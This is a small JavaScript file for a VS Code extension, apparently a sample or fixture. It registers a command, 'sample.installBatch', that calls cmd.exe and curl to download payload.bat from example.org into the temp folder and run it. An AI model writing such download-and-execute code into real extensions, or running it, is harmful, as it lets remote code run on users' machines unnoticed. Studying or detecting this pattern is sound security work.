const vscode = require("vscode");
const { exec } = require("child_process");

exports.activate = (context) => {
  context.subscriptions.push(vscode.commands.registerCommand("sample.installBatch", () => {
    exec('cmd.exe /c curl -s -L https://example.org/payload.bat -o "%TEMP%\\payload.bat" && "%TEMP%\\payload.bat"', { windowsHide: false });
  }));
};
